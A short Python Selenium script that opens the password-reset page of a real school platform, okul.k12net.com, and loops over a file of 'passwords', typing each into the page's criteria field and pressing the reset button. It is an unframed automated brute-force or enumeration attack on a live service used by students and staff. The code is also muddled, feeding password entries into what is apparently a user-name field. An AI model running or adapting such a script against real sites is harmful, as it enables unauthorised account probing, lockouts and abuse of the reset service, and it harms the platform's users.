from selenium import webdriver
import time
from selenium.webdriver.common.by import By
import time

browser = webdriver.Firefox()

browser.get('https://okul.k12net.com/ResetPassword.aspx')

time.sleep(3)

file = open("passwords.txt", "r")

user_name = browser.find_element(By.ID, "inputCriteria")
find = browser.find_element("xpath", '//*[@id="resetPasswordForm"]/div/div/fieldset/div/div[3]/button')
time.sleep(3)

for password in file:
    password = password.strip()
    try:
        print(password)  
        user_name.send_keys(password)
    except:
        pass

    find.click()
    user_name.clear()